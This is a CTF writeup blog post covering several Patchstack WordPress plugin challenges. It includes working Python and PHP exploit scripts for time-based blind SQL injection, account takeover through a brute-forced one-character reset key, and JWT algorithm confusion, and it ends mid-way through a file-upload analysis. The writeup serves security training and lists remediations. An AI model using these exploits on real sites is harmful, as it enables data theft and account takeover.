---
layout: post
title: "Patchstack WCUS CTF 2024 - Writeup"
date: 2024-09-23 00:00:00
description: "Patchstack WCUS CTF 2024 - Writeup"
tag:
  - Web
  - WordPress
---

<h2>Table of Contents</h2>
- TOC	- TOC
{:toc}

> To make it easier to Jump to Section, you can search for the name of the challenge.

# **Link Manager**

**Description:**\
I am very angry that WordPress dropped the support for Link Manager in version 3.5 release. I created my own plugin to cover that feature and it is still in the beta phase, can you check if everything's solid?
NOTE: This is a fully white box challenge, almost no heavy brute force is needed.
http://100.25.255.51:9097/

**Analysis:**\
This challenge involved a custom WordPress plugin. We were provided with the source code and a Docker setup to analyze and debug the vulnerability.

The first step I took was to check the location of the FLAG. Based on the .env file and docker/wordpress/toolbox/Makefile, the FLAG was stored as an option value added using WP-CLI. This means the FLAG was inserted into the WordPress database table wp_options, with the option name "flag_links_data" and the option value "REDACTED", as seen in the config below.

```sh
.env File:
// ...
FLAG_NAME="flag_links_data"
FLAG_VALUE="REDACTED"

docker/wordpress/toolbox/Makefile File:
// ...
$(WP_CLI) option add ${FLAG_NAME} ${FLAG_VALUE}
```

From the source code, we identified the custom plugin used as Link Manager. The link-manager.php file revealed that the main class file was located in /include/main-class.php.

```php
// Require the main class file
require_once( WPS_DIRECTORY . '/include/main-class.php' );
```

In the main-class.php file, we narrowed our analysis by searching for hooks and functions that didn’t require any privileges to execute. We discovered two functions: handle_ajax_link_submission and get_link_data. These functions could be accessed publicly by sending requests to /wp-admin/admin-ajax.php with a specific action, such as /wp-admin/admin-ajax.php?action=get_link_data.

```php
add_action( 'wp_ajax_nopriv_submit_link', 'handle_ajax_link_submission' );
// ...
add_action('wp_ajax_nopriv_get_link_data', 'get_link_data');
```

**Vulnerable Code: SQL Injection ORDER BY Clause**\
We knew that these two functions didn’t require any privileges for execution. Our focus was on the get_link_data function because it involved an SQL query using user inputs (link_name, order, and orderby) and a sanitize_text_field filter, which was vulnerable to SQL Injection. (Read [Source](https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/)).

```php
function get_link_data() {
    global $wpdb;
    $table_name = $wpdb->prefix . 'links';
    // sanitize_text_field not prevent SQL Injection
    $link_name = sanitize_text_field($_POST['link_name']);
    $order = sanitize_text_field($_POST['order']);
    $orderby = sanitize_text_field($_POST['orderby']);

    validate_order($order);
    validate_order_by($orderby);

    // Vulnerable to SQL Injection
    $results = $wpdb->get_results("SELECT * FROM wp_links where link_name = '$link_name' order by $orderby $order");

    if (!empty($results)) {
        wp_send_json_success($results);
    } else {
        wp_send_json_error('No data found.');
    }
}
```

Exploiting SQL Injection in an ORDER BY clause is significantly different from most other cases. A database will not accept a UNION, WHERE, OR, or AND keyword at this point in the query (Read [Source](https://portswigger.net/support/sql-injection-in-the-query-structure)).

Technically, the ORDER BY clause is typically used to sort results based on columns or other criteria. In this case of SQL Injection within the ORDER BY clause, we could exploit it using a nested query (a query within a query) to execute more complex logic, such as a Time-Based Blind SQL Injection.

**Vulnerability Validation:**\
Validated this with the payload (select \* from (select (sleep(10)))a) and observed an 11-second response delay, confirming the vulnerability to SQL Injection.
![Payload](/assets/img/Patchstack-WCUS-CTF-2024/Link_Manager_1.png)
![Delay Time](/assets/img/Patchstack-WCUS-CTF-2024/Link_Manager_2.png)

**Steps to Exploit:**

1. Data exfiltration was achieved using Time-Based SQL Injection by dumping data from the column where the FLAG was located, specifically the wp_options table's option_value column where option_name = "flag_links_data".
2. To confirm the FLAG’s location, we checked by running the Docker MySQL instance.
   ![Flag Docker](/assets/img/Patchstack-WCUS-CTF-2024/Link_Manager_3.png)

**Exploitation:**

```python
import requests
import time
from string import ascii_lowercase, ascii_uppercase, digits

URL = 'http://100.25.255.51:9097/wp-admin/admin-ajax.php?action=get_link_data'
charset = ascii_uppercase + ascii_lowercase + digits + '}{_'

class Exploit:
	def __init__(self, url=URL):
		self.url = url

	def blind(self):
		flag = ""
		position = 1
		while "}" not in flag:
			for char in charset:
				start = time.time()

				# Dump Flag
				payload = f'(SELECT * FROM(SELECT IF(ASCII(SUBSTRING((SELECT option_value FROM wp_options limit 1 offset 123),{position},1))={ord(char)},sleep(3),0))a) DESC--'

				data = {'action':'get_link_data','link_name':'','order':'DESC','orderby':f'link_id,{payload}'}
				getLinkData = requests.post(URL, data=data)

				end = time.time()
				timebased = int(end-start)
				if timebased >= 3:
					flag += char
					position += 1
					print(f'[+] Found Flag: {flag}')
				else:
					pass
		return f'[+] Found Flag: {flag}'

if __name__ == '__main__':
	run = Exploit()
	print(run.blind())
```

Run the exploit, and the FLAG was successfully retrieved.
![](/assets/img/Patchstack-WCUS-CTF-2024/Link_Manager_Flag.png)

**FLAG:** CTF{ord3ring_sql_inj3ction_links}

**Remediation:**

- Use query-prepared Statement
- Use esc_sql function
- Use sanitize_sql_orderby
- [Source](https://patchstack.com/academy/wordpress/securing-code/sql-injection/)

# **Secret Info**

**Description:**\
Our admin accidentally published some secret images on our site. Unfortunately, somehow we are not able to unpublish the secret image. however, we tried to apply some protection to our site. This should be enough, right?
NOTE: This is a fully white box challenge, almost no heavy brute force is needed.
http://100.25.255.51:9091/

**Analysis:**\
This challenge involved a custom WordPress plugin. We were provided with the source code and a Docker setup to analyze and debug the vulnerability.

The first step I took was to check the location of the FLAG. From the list of source code files, it was revealed that the FLAG is in the form of a PNG image. However, a grep search did not find where the FLAG image was being used.
![flag location](/assets/img/Patchstack-WCUS-CTF-2024/SecretInfo_1.png)

Additionally, from the Dockerfile and Makefile, it was found that the name of the FLAG image within the container was unknown (here it’s referenced as REDACTED.png). The FLAG image was also imported into the media library using wp-cli.

```sh
// File Dockerfile
COPY flag.png /REDACTED.png

// ...

// File Makefile
$(WP_CLI) media import /REDACTED.png
```

**Vulnerable Config: Broken Access Control**\
According to the challenge description, there was protection in place to prevent logged-in users from accessing the page that likely contained the FLAG image.

From the source code, it was found that this protection was implemented in the .htaccess file, which blocks access to the endpoints edit.php, post-new.php, post.php, and edit-comments.php. Since the protection only blocks access to the frontend endpoints, we can bypass it by using the WordPress REST API to access media through the API without requiring authentication.

```sh
// ...
RewriteCond %{THE_REQUEST} media($|\ |\?)  [NC]
// ...
RewriteRule ^wp-admin/edit.php$ - [F]
RewriteRule ^wp-admin/post-new.php$ - [F]
RewriteRule ^wp-admin/post.php$ - [F]
RewriteRule ^wp-admin/edit-comments.php$ - [F]
```

As for the test-plugin, I believe it is a rabbit hole because the plugin only handles user registration. Even if a user successfully registers, they still won’t be able to access the frontend endpoints mentioned above (unless this step is an unintended way to solve the challenge). For additional context, here is the function from the plugin that handles the user registration process:

```php
add_action("wp_ajax_nopriv_register_user", "register_user");

function register_user(){
    $username = sanitize_text_field($_POST["username"]);
    $password = sanitize_text_field($_POST["password"]);
    $email = sanitize_text_field($_POST["email"]);

    wp_create_user($username, $password, $email);
    echo "user created";
}
```

**Exploitation:**\
WordPress has a REST API route with the path /wp-json/ (Read [source](https://developer.wordpress.org/rest-api/key-concepts/)). Below is what the REST API route looks like when accessed.
![Route API](/assets/img/Patchstack-WCUS-CTF-2024/SecretInfo_2.png)

To obtain the FLAG, since our analysis revealed that the Makefile performs a media import of the FLAG using wp-cli, we can access the /wp-json/wp/v2/media/ endpoint to retrieve the filename of the FLAG image without requiring authentication.
![Filename Flag](/assets/img/Patchstack-WCUS-CTF-2024/SecretInfo_3.png)

Simply access the endpoint for the FLAG image with the filename "flag_secret_not_so_random_get_me_1337.png", and the FLAG will be obtained.
![Flag](/assets/img/Patchstack-WCUS-CTF-2024/SecretInfo_Flag.png)

**Flag:** CTF{67fd32eea87891bc_it_is_a_feature_by_core_xd}

**Remediation:**

- Implementing protection with permission checks (Read [source](https://patchstack.com/academy/wordpress/securing-code/broken-access-control/))

# **WP Elevator**

**Description:**\
Asked my freelance developer friend to write me an authorization plugin so I can share knowledge with selected memebers. He is still working on it but gave me an early version. I don't know how it works but will talk with him once he finishes.
Note: fully whitebox challenge, no need to do massive bruteforce
http://100.25.255.51:9093/

**Analysis:**\
This challenge involved a custom WordPress plugin. We were provided with the source code and a Docker setup to analyze and debug the vulnerability.

The first step I took was to check the location of the FLAG. It was discovered that there was a line that reads /flag.txt using the file_get_contents function in the p-member-manager.php file.

```sh
grep -R "flag.txt"
// Output
Dockerfile:COPY challenge-custom/flag.txt /flag.txt
Dockerfile:RUN chmod 0444 /flag.txt
challenge-custom/p-member-manager/p-member-manager.php:        $value = file_get_contents('/flag.txt');
```

The custom plugin used is p-member-manager. Based on the FLAG location check above, we proceed to analyze the p-member-manager.php file and jump to the line containing file_get_contents('/flag.txt'). It was found that this line is inside the flagger_request_callback function, and to execute this action at /wp-admin/admin-ajax.php?action=patchstack_flagger, authentication is required.

```php
add_action("wp_ajax_patchstack_flagger", "flagger_request_callback");

function flagger_request_callback()
{
    // Validate nonce
    $nonce = isset($_REQUEST["nonce"])
        ? sanitize_text_field($_REQUEST["nonce"])
        : "";
    if (!wp_verify_nonce($nonce, "get_latest_posts_nonce")) {
        wp_send_json_error("Invalid nonce.");
        return;
    }
    $user = wp_get_current_user();
    $allowed_roles = ["administrator", "subscriber"];
    if (array_intersect($allowed_roles, $user->roles)) {
        $value = file_get_contents('/flag.txt');
        wp_send_json_success(["value" => $value]);
    } else {
        wp_send_json_error("Missing permission.");
    }
}
```

According to the flagger_request_callback function, we can obtain the flag if the following conditions are met:

1. CSRF protection with a nonce, so reading the flag must use a valid nonce.
2. The user roles allowed to read the flag are administrator and subscriber.

**Analysis: How to Get Nonce?**\
Based on the flagger_request_callback function, the nonce is generated using the get_latest_posts_nonce function. To generate the nonce, you can request it from /wp-admin/admin-ajax.php?action=get_latest_posts using a user cookie with the subscriber role.

```php
add_action("wp_ajax_get_latest_posts", "get_latest_posts_callback");

function get_latest_posts_callback()
{
    // Check if the current user has the subscriber role
    if (!current_user_can("subscriber")) {
        wp_send_json_error("Unauthorized access.");
        return;
    }

    // Generate nonce
    $nonce = wp_create_nonce("get_latest_posts_nonce");

    // Get latest 5 posts
    $args = [
        "posts_per_page" => 5,
        "post_status" => "publish",
        "orderby" => "date",
        "order" => "DESC",
    ];

    $latest_posts = get_posts($args);

    // Prepare posts data
    $posts_data = [];
    foreach ($latest_posts as $post) {
        $posts_data[] = [
            "title" => $post->post_title,
            "content" => $post->post_content,
            "link" => get_permalink($post),
        ];
    }

    // Send response with nonce and posts data
    wp_send_json_success(["nonce" => $nonce, "posts" => $posts_data]);
}
```

**Analysis: How to be Authenticated?**\
So, how can we log in or register a user with the administrator or subscriber role? After analyzing the source code further, we discovered that the registration endpoint is at "http://target/wp-json/user/v1/create", which accepts a POST request. This endpoint calls the create_user_via_api function, which requires the username and email parameters in JSON format, and the role will be set as subscriber. However, the password is randomly generated using wp_generate_password, so we do not know it.

```php
add_action("rest_api_init", "register_user_creation_endpoint");

function register_user_creation_endpoint()
{
    register_rest_route("user/v1", "/create", [
        "methods" => "POST",
        "callback" => "create_user_via_api",
        "permission_callback" => "__return_true", // Allow anyone to access this endpoint
    ]);
}

// ...

function create_user_via_api($request)
{
    $parameters = $request->get_json_params();

    $username = sanitize_text_field($parameters["username"]);
    $email = sanitize_email($parameters["email"]);
    $password = wp_generate_password();

    // Create user
    $user_id = wp_create_user($username, $password, $email);

    if (is_wp_error($user_id)) {
        return new WP_Error(
            "user_creation_failed",
            __("User creation failed.", "text_domain"),
            ["status" => 500]
        );
    }

    // Add user role
    $user = new WP_User($user_id);
    $user->set_role("subscriber");

    return [
        "message" => __("User created successfully.", "text_domain"),
        "user_id" => $user_id,
    ];
}
```

Alright, we now know how to generate a nonce and register a user with the subscriber role.
But how do we log in using the registered user when the password is randomly generated?

**Analysis: How to Access the Registered User**\
In the source code, there is an action reset_key that does not require privileges (wp_ajax_nopriv_reset_key). This action calls the reset_password_key_callback function. To reset the password, the only parameter needed is the user_id.

```php
add_action("wp_ajax_nopriv_reset_key", "reset_password_key_callback");

function reset_password_key_callback()
{
    $user_id = isset($_POST["user_id"]) ? intval($_POST["user_id"]) : 0;
    $user = new WP_User($user_id);
    if ($user_id > 1) {
        if (
            !empty($user->roles) &&
            is_array($user->roles) &&
            in_array("subscriber", $user->roles)
        ) {
            $updated = get_password_reset_key2($user);
            if (is_wp_error($updated)) {
                wp_send_json_error("Failed to reset password key.");
            } else {
                wp_send_json_success([
                    "message" => "Password reset key reset successfully.",
                ]);
            }
        } else {
            wp_send_json_error("User is not a subscriber.");
        }
    } else {
        wp_send_json_error("Invalid user ID.");
    }
}
```

However, the function above does not directly reset the password, it only retrieves the user_id. The actual password reset process is handled by the $updated variable and processed by the get_password_reset_key2 function. You could say that the reset_password_key_callback function acts as a "jump host." Therefore, let's analyze the get_password_reset_key2 function further.

**Vulnerable Code: Weak Activation Key**\
In the get_password_reset_key2 function, we can see that user_activation_key only generates a 1-character key, whereas according to WordPress documentation, it should be 20 characters long (Read [source](https://developer.wordpress.org/reference/functions/get_password_reset_key/)). This means we can bruteforce this 1-character key.

```php
    // ...
    // Generate something random for a password reset key.
    $key = wp_generate_password(1, false);
	// ...
    do_action("retrieve_password_key", $user->user_login, $key);

    // Now insert the key, hashed, into the DB.
    if (empty($wp_hasher)) {
        require_once ABSPATH . WPINC . "/class-phpass.php";
        $wp_hasher = new PasswordHash(8, true);
    }

    $key_saved = wp_update_user([
        "ID" => $user->ID,
        "user_activation_key" => $hashed,
    ]);

    if (is_wp_error($key_saved)) {
        return $key_saved;
    }

    return $key;
```

The charset used is "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", as can be seen in the class-phpass.php file (Read [source](https://github.com/WordPress/WordPress/blob/master/wp-includes/class-phpass.php)).

The bruteforce attack is performed by sending a GET request to /wp-login.php?action=rp&key={key}&login={username}

**Exploitation:**\
Okay, now we know the flow to obtain the flag:

1. Register a user with the subscriber role by sending a request to /wp-json/user/v1/create.
2. Reset the password of the registered user by sending a request to /wp-admin/admin-ajax.php?action=reset_key.
3. Obtain the activation key by bruteforcing the weak key by sending a GET request to /wp-login.php?action=rp&key={key}&login={username}.
4. Generate the nonce by sending a request to /wp-admin/admin-ajax.php?action=get_latest_posts.
5. Read the flag using the nonce.

Here is the automation script I used:

```python
import requests
import json
from urllib.parse import *

URL = 'http://100.25.255.51:9093/'

class Exploit:
	def __init__(self, username, email, newpassword, url=URL):
		self.url = url
		self.session = requests.session()
		self.username = username
		self.email = email
		self.newpassword = newpassword

	def register(self):
		print('[+] Register User')
		headers = {'Content-type':'application/json'}
		data = {'username':f'{self.username}', 'email':f'{self.email}'}
		req = requests.post(urljoin(self.url, '/wp-json/user/v1/create'), json=data, headers=headers)

		return json.loads(req.text)['user_id']

	def reset_password(self):
		data = {'user_id':f'{self.register()}'}
		print('[+] Trigger User Reset Password')
		req = requests.post(urljoin(self.url, '/wp-admin/admin-ajax.php?action=reset_key'), data=data)

		return req.text

	def bruteforceKey(self):
		print('[+] Bruteforce Activation Key')
		charset = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
		key = ''
		for char in charset:
			req = self.session.get(urljoin(self.url, f'/wp-login.php?action=rp&key={char}&login={self.username}'))
			if 'invalid' not in req.text:
				print(f'[+] Found Key = {char}')
				key += char
				break
			else:
				pass

		return key

	def setnewpass(self):
		print('[+] Setting New Password')
		data = {'pass1':self.newpassword,'pass2':self.newpassword,'rp_key':self.bruteforceKey(),'wp-submit':'Save Password'}
		req = self.session.post(urljoin(self.url, '/wp-login.php?action=resetpass'), data=data)
		if 'Your password has been reset' in req.text:
			return '[+] Success Reset Password'

		else:
			'[+] Reset Password Fail!'

	def loginWordpress(self):
		print('[+] Login to Wordpress')
		headers = {'Cookie':'wordpress_test_cookie=WP Cookie check'}
		data = {'log':self.username, 'pwd':self.newpassword, 'wp-submit':'Log In', 'redirect_to':urljoin(self.url, '/wp-admin/'), 'testcookie':'1'}
		req = self.session.post(urljoin(self.url, '/wp-login.php'), headers=headers, data=data)
		res = self.session.get(urljoin(self.url, '/wp-admin/profile.php'))

		return res.text

	def getNonce(self):
		print('[+] Getting Nonce')
		req = self.session.post(urljoin(self.url, '/wp-admin/admin-ajax.php?action=get_latest_posts'))

		return json.loads(req.text)['data']['nonce']

	def getFlag(self):
		data = {'nonce':self.getNonce()}
		print('[+] Reading Flag')
		req = self.session.post(urljoin(self.url, '/wp-admin/admin-ajax.php?action=patchstack_flagger'), data=data)

		return json.loads(req.text)['data']['value']

if __name__ == '__main__':
	run = Exploit('banua','banua@banua.github.io', 'ND8Ilg&6@z)SQ4GOiYtq)ozp')
	print(run.reset_password())
	print(run.setnewpass())
	run.loginWordpress()
	print(run.getFlag())
```

Run the script, and the FLAG is obtained.
![Flag](/assets/img/Patchstack-WCUS-CTF-2024/WPElevator_Flag.png)

**Flag:** CTF{763edf891200bb_n0nc3s_f0r_auth0riz4t10n}

**Remediation:**

- Use strong Key with minimum length 20 character (Default [Source](https://developer.wordpress.org/reference/functions/get_password_reset_key/))

# **JustinWonkyTokens**

**Description:**\
Hey, new Wordpress Dev here. I'm developing a simple authentication checker service that I will later connect it to a REST api. I have downloaded some boilerplate plugin templates and started working on them. I have a demo plugin already do you want to check if it works correctly?
This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).
http://100.25.255.51:9094/

**Analysis:**\
This challenge involved a custom WordPress plugin. We were provided with the source code to analyze and debug the vulnerability.

The first step I took was to check the location of the FLAG. It was found that there is a line that reads the FLAG using the file_get_contents function in the p-member-manager.php file. After further inspection, this line is located within the simple_jwt_handler function.

```php
function simple_jwt_handler() {
    $flag = file_get_contents('/flag.txt');
    $privateKey = file_get_contents('/jwt.key');
    $publicKey = <<<EOD
    -----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqXfQ7ExnjmPJbSwuFoxw
    3kuBeE716YM5uXirwUb0OWB5RfACAx9yulBQJorcQIUdeRf+YpkQU5U8h3jVyeqw
    HzjOjNjM00CVFeogTnueHoose7Jcdi/K3NyYcFQINui7b6cGab8hMl6SgctwZu1l
    G0bk0VcqgafWFqSfIYZYw57GYhMnfPe7OR0Cvv1HBCD2nWYilDp/Hq3WUkaMWGsG
    UBMSNpC2C/3CzGOBV8tHWAUA8CFI99dHckMZCFJlKMWNQUQlTlF3WB1PnDNL4EPY
    YC+8DqJDSLCvFwI+DeqXG4B/DIYdJyhEgMdZfAKSbMJtsanOVjBLJx4hrNS42RNU
    dwIDAQAB
    -----END PUBLIC KEY-----
    EOD;

    $issuedAt = new DateTimeImmutable();
    $data = [
        "role" => "guest",
        "iat" => $issuedAt->getTimestamp(),
        "nbf" => $issuedAt->getTimestamp()
    ];

    if (!isset($_COOKIE['simple_jwt'])) {
        setcookie('simple_jwt', SimpleJWTHandler::encodeToken($data, $privateKey, 'RS256'));
        echo 'JWT has been set.';
    } else {
        $token = $_COOKIE['simple_jwt'];
        try {
            $decoded = SimpleJWTHandler::decodeToken($token, $publicKey);
            if ($decoded->role == 'admin') {
                echo 'Success: ' . $flag;
            } elseif ($decoded->role == 'guest') {
                echo 'Role is guest.';
            }
        } catch (Exception $e) {
            echo 'Token verification failed.';
        }
    }
```

From that function, if the request does not contain the simple_jwt cookie, a new cookie is set by generating an Asymmetric JWT using RS256, with the payload containing the role as a "guest". To obtain the FLAG, the role of the user making the request must be set to "admin."

Additionally, the simple_jwt_handler action does not require any privileges, meaning it can be accessed publicly through the endpoint /wp-admin/admin-ajax.php?action=simple_jwt_handler.

```php
add_action('wp_ajax_nopriv_simple_jwt_handler', 'simple_jwt_handler');
add_action('wp_ajax_simple_jwt_handler', 'simple_jwt_handler');
```

**What’s the Difference Between Asymmetric and Symmetric JWT?**\
Simply put, Asymmetric JWT uses two keys for security, a private key and a public key. Symmetric JWT, on the other hand, uses only one key, known as the secret key.

**How to Become Admin?**\
So, how do we become an admin? Based on the simple_jwt_handler function, it’s clear that the JWT is decoded using the decodeToken function, which has two parameters, the $token variable and the $publicKey variable.

- $token: This is the value of the simple_jwt cookie used for the request.
- $publicKey: Contains the public key, which is hardcoded in simple_jwt_handler function.

```php
// ...
$token = $_COOKIE['simple_jwt'];
try {
    $decoded = SimpleJWTHandler::decodeToken($token, $publicKey);
    if ($decoded->role == 'admin') {
        echo 'Success: ' . $flag;
    } elseif ($decoded->role == 'guest') {
        echo 'Role is guest.';
    }
// ...
```

In the decodeToken function within the SimpleJWTHandler class, it first checks the JWT structure and then verifies the signature by calling the verifySignature function.

```php
// ...
if (!self::verifySignature("$header64.$payload64", $signature, $key, $header->alg)) {
    throw new UnexpectedValueException('Signature verification failed');
// ...
```

**Vulnerable Code: JWT Key Confusion Attack**\
Upon analyzing the verifySignature function, it is found that the algorithm used is HS256. Additionally, there are two possible cases, one using openssl and the other using hash_hmac. From the algorithm and these two cases, it can be concluded that this function also verifies using the HS256 algorithm.

```php
public static function verifySignature($message, $signature, $key, $algo = 'HS256')
{
    if (empty(self::$algorithms[$algo])) {
        throw new DomainException('Unsupported algorithm');
    }
    list($function, $algorithm) = self::$algorithms[$algo];
    switch ($function) {
        case 'openssl':
            $success = openssl_verify($message, $signature, $key, $algorithm);
            if (!$success) {
                throw new DomainException("OpenSSL verification failure");
            }
            return true;
        case 'hash_hmac':
        default:
            return $signature === hash_hmac($algorithm, $message, $key, true);
    }
}
```

Based to a source from [Hacktricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#change-the-algorithm-rs256-asymmetric-to-hs256-symmetric-cve-2016-5431-cve-2016-10555), If you change the algorithm from RS256 to HS256, the back end code uses the public key as the secret key and then uses the HS256 algorithm to verify the signature. Then, using the public key and changing RS256 to HS256 we could create a valid signature.

**Steps to Exploitation:**

1. We already have the public key from the simple_jwt_handler function.
2. Use that public key to generate a Symmetric JWT with HS256, containing the payload with the role set to "admin".
3. Use generated cookie with "admin" role to getting FLAG.

**Exploitation:**\
The PHP script below was used to generate the cookie with the role set to "admin."

```php
<?php

class SimpleJWTHandler
{
    static $algorithms = array(
        'HS256' => array('hash_hmac', 'SHA256'),
        'HS512' => array('hash_hmac', 'SHA512'),
        'HS384' => array('hash_hmac', 'SHA384'),
        'RS256' => array('openssl', 'SHA256'),
    );

    public static function encodeToken($data, $key, $algo = 'HS256', $keyId = null)
    {
        $header = array('typ' => 'JWT', 'alg' => $algo);
        if ($keyId !== null) {
            $header['kid'] = $keyId;
        }
        $segments = array(
            self::urlSafeBase64Encode(self::jsonEncode($header)),
            self::urlSafeBase64Encode(self::jsonEncode($data))
        );
        $signingInput = implode('.', $segments);
        $signature = self::createSignature($signingInput, $key, $algo);
        $segments[] = self::urlSafeBase64Encode($signature);

        return implode('.', $segments);
    }

    public static function createSignature($message, $key, $algo = 'HS256')
    {
        if (empty(self::$algorithms[$algo])) {
            throw new DomainException('Unsupported algorithm');
        }
        list($function, $algorithm) = self::$algorithms[$algo];
        switch ($function) {
            case 'hash_hmac':
                return hash_hmac($algorithm, $message, $key, true);
            case 'openssl':
                $signature = '';
                $success = openssl_sign($message, $signature, $key, $algorithm);
                if (!$success) {
                    throw new DomainException("OpenSSL signature failure");
                }
                return $signature;
        }
    }

    public static function jsonEncode($input)
    {
        $result = json_encode($input);
        if (json_last_error() !== JSON_ERROR_NONE) {
            throw new DomainException('JSON encoding error');
        }
        return $result;
    }

    public static function urlSafeBase64Encode($input)
    {
        return str_replace('=', '', strtr(base64_encode($input), '+/', '-_'));
    }
}

function main(){
	$publicKey = <<<EOD
	-----BEGIN PUBLIC KEY-----
	MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqXfQ7ExnjmPJbSwuFoxw
	3kuBeE716YM5uXirwUb0OWB5RfACAx9yulBQJorcQIUdeRf+YpkQU5U8h3jVyeqw
	HzjOjNjM00CVFeogTnueHoose7Jcdi/K3NyYcFQINui7b6cGab8hMl6SgctwZu1l
	G0bk0VcqgafWFqSfIYZYw57GYhMnfPe7OR0Cvv1HBCD2nWYilDp/Hq3WUkaMWGsG
	UBMSNpC2C/3CzGOBV8tHWAUA8CFI99dHckMZCFJlKMWNQUQlTlF3WB1PnDNL4EPY
	YC+8DqJDSLCvFwI+DeqXG4B/DIYdJyhEgMdZfAKSbMJtsanOVjBLJx4hrNS42RNU
	dwIDAQAB
	-----END PUBLIC KEY-----
	EOD;

	$issuedAt = new DateTimeImmutable();
	$data = [
		"role" => "admin",
		"iat" => $issuedAt->getTimestamp(),
		"nbf" => $issuedAt->getTimestamp()
	];

	$token = SimpleJWTHandler::encodeToken($data, $publicKey, 'HS256');

    $url = 'http://100.25.255.51:9094/wp-admin/admin-ajax.php?action=simple_jwt_handler';

    $ch = curl_init($url);

    $cookie = 'simple_jwt=' . $token;

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    echo $response;

}

main();

?>
```

Run the exploit and the FLAG will be obtained.
![Flag](/assets/img/Patchstack-WCUS-CTF-2024/JustinWonkyTokens_Flag2.png)

**Flag:** CTF{4lg0rithms_4r3_funny_1z268}

**Remediation:**

- enforce strict verification of the algorithm RS256 only or other Asymmetric algorithm.

# **My Shop Disaster**

**Description:**\
I just installed wordpress to sell my stuff with Woocommerce. I found it a bit boring so I installed that other plugin to pimp it, I don't think it could cause a security issue?
This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).
http://100.25.255.51:9090/

**Analysis:**\
This challenge involved a custom WordPress plugin. We were provided with the source code and a Docker setup to analyze and debug the vulnerability.

The first step I took was to check the location of the FLAG. According to the Dockerfile, the FLAG is stored in the root directory ("/") under the name flag.txt. The source code did not show any references to reading the FLAG, which suggests that we may need to gain Remote Code Execution (RCE) to access it.
![Find Flag](/assets/img/Patchstack-WCUS-CTF-2024/MyShopDisaster_1.png)

The custom plugin used is woo-variations. Here, I focused on analyzing the files within the Includes folder in the source code provided.
![Tree includes](/assets/img/Patchstack-WCUS-CTF-2024/MyShopDisaster_2.png)

In the class-woo-variations-rest-api.php file, there is a route that enables the registration function in WordPress, allowing GET requests to be sent to /wp-json/woo-variations/v1/registration-enable/ without requiring any request body.

```php
function register_customer_registration_enable() {
	register_rest_route( 'woo-variations/v1', '/registration-enable/', array(
		'methods'  => 'GET',
		'callback' => array($this, 'registration_enable'),
		'args'     => array(
			'data' => array(
			'required' => false,
			'default'  => array(),
			)
		)
	 ));
}

function registration_enable( $data ) {
	update_option( 'users_can_register', 1 );
	wp_send_json('Customer registration enabled');
}
```

Next, I analyzed the backend code in the class-woo-variations-backend.php file. I looked for actions that do not require privileges and found two actions, set_gallery_picture and associate_product_variation.

```php
add_action( 'wp_ajax_nopriv_associate_product_variation', array( $this, 'associate_product_variation' ) );
add_action( 'wp_ajax_nopriv_set_gallery_picture', array( $this, 'set_gallery_picture' ) );
```

**Vulnerable Code: Arbitrary File Upload**

```php
public function set_gallery_picture() {

	if ( !is_admin() || !$this->check_permission() )
	{
		wp_send_json( 'Unauthorized!' );
	}

	$product_id = isset( $_POST['product_id'] ) ? intval( $_POST['product_id'] ) : 0;

	// Verify that the product exists and is a WooCommerce product
	if ( $product_id && function_exists( 'wc_get_product' ) ) {

		if ( $_FILES && isset( $_FILES['gallery_picture'] ) ) {

			$file = $_FILES['gallery_picture'];
			$file_type = wp_check_filetype( basename( $file['name'] ), array( 'jpg', 'jpeg', 'png' ) );

			$upload_dir = wp_upload_dir();
			$upload_path = $upload_dir['basedir'] . '/woo-gallery/';
			if ( !file_exists( $upload_path ) ) {
				wp_mkdir_p( $upload_path );
			}

			if (move_uploaded_file( $file['tmp_name'], $upload_path . sanitize_file_name($file['name']) ) ) {

				$file_url = $upload_dir['baseurl'] . '/woo-gallery/' . sanitize_file_name($file['name']);

				if (function_exists( 'wc_gallery_set_attachment_from_url' ) )
				{
					$attachment_id = wc_gallery_set_attachment_from_url( $file_url, $product_id);
					if ( $attachment_id) {
						echo json_encode(array( 'success' => true, 'message' => 'Gallery picture uploaded successfully.' ) );
					} else {
						echo json_encode(array( 'success' => false, 'message' => 'Error adding attachment to product gallery.' ) );
					}
				}
				else {
					echo json_encode(array( 'success' => false, 'message' => 'Error adding attachment to Woocommerce product.' ) );
				}

			} else {
				echo json_encode(array( 'success' => false, 'message' => 'Error uploading file.' ) );
			}
		} else {
			echo json_encode(array( 'success' => false, 'message' => 'No file uploaded.' ) );
		}
	} else {
		echo json_encode(array( 'success' => false, 'message' => 'Invalid product ID.' ) );
	}
}
```

The set_gallery_picture function primarily handles file uploads. However, it includes protection with is_admin() and check_permission() checks, as shown below.

```php
if ( !is_admin() || !$this->check_permission() )
{
	wp_send_json( 'Unauthorized!' );
}
```

Based on the [source](https://facetwp.com/is_admin-and-ajax-in-wordpress/), the is_admin() check will always return TRUE if the request is made through /wp-admin/admin-ajax.php. Since we are using the AJAX route /wp-admin/admin-ajax.php with the set_gallery_picture action, which does not require privileges, the is_admin() condition is bypassed, as it evaluates to TRUE.

Next, the check_permission function uses custom validation as follows.

```php
function check_permission() {

	if ( !current_user_can( "manage_options" ) && strpos( wp_get_current_user()->user_login, 'admin' ) === false )
	{
		return false;
	}

	return true;
}
```

In the check_permission function above, the following conditions are checked:

1. !current_user_can("manage_options"): This means that if the user does not have permission to manage options (which is typically granted to Administrators), the result will be FALSE.
2. If the logged-in user's username does not contain the word "admin," the result will also be FALSE.
3. If either of these conditions is met, the function will return TRUE.

Here, we can exploit the second condition, which requires that the logged-in user's username contains the word "admin." We can create a user with a username that includes "admin."

Okay, now that we’ve met the authorization checks for the set_gallery_picture function, let's look at the file extension validation line.

```php
